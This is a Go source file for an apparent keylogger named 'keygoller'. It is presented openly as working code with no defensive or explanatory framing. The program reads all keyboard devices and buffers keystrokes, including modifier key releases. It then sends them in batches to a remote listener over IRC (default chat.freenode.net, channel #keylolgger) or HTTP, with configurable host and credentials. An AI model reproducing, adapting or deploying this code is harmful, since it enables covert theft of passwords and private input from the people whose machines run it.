package main

import (
	"flag"
	"log"
	"os"
	"strings"

	"github.com/MarinX/keylogger"
	"github.com/rotsix/keygoller/keyboard"
	"github.com/rotsix/keygoller/net"
)

func main() {
	protocol := flag.String("protocol", "debug", "protocol to use to send strokes")
	config := net.Config{}
	flag.StringVar(&config.Host, "host", "chat.freenode.net", "host to send strokes to")
	flag.IntVar(&config.Port, "port", 6667, "port to send strokes to")
	// in case of authentication
	flag.StringVar(&config.User, "user", "Guest74629", "user to connect with")
	flag.StringVar(&config.Pass, "pass", "hunter2", "password associated to the user")
	// irc
	flag.StringVar(&config.Channel, "channel", "#keylolgger", "channel to send strokes to (IRC)")
	// http
	flag.StringVar(&config.URL, "url", "/data", "url to send strokes to (HTTP)")
	flag.StringVar(&config.Request, "request", "post", "type of request to send (HTTP)")

	size := flag.Int("size", 512, "number of strokes to get before sending")
	flag.Parse()

	// get the keyboards
	keyboards := []keyboard.Keyboard{}
	for _, location := range keyboard.List() {
		kb, ok := keyboard.Read(location)
		if !ok {
			continue
		}
		kb.Buffer = make([]string, *size)
		keyboards = append(keyboards, kb)
	}
	if len(keyboards) == 0 {
		log.Println("no keyboard found, aborting")
		os.Exit(1)
	}

	// connect to the listener
	connection, err := net.Init(*protocol, config)
	if err != nil {
		log.Println("couldn't connect to listener:", err)
		os.Exit(1)
	}

	// read and send
	done := make(chan bool)
	for _, kb := range keyboards {
		go handle(kb, *size, connection, done)
	}
	<-done
}

func handle(kb keyboard.Keyboard, size int, conn net.Connection, done chan<- bool) {
	for event := range kb.Channel {
		switch event.Type {
		case keylogger.EvKey:
			if kb.Index == size {
				// buffer is full
				kb.Index = 0
				var sb strings.Builder
				sb.WriteString(kb.Location + ": ")
				for _, str := range kb.Buffer {
					sb.WriteString(str + " ")
				}
				conn.Write(sb.String())
			}

			if event.KeyPress() {
				kb.Buffer[kb.Index] = event.KeyString()
				kb.Index++
			}

			if event.KeyRelease() {
				// show released key only with modifiers
				if strings.Contains(event.KeyString(), "SHIFT") ||
					strings.Contains(event.KeyString(), "CTRL") ||
					strings.Contains(event.KeyString(), "ALT") {
					kb.Buffer[kb.Index] = "RELEASED_" + event.KeyString()
					kb.Index++
				}
			}
		}
	}
	done <- true
}
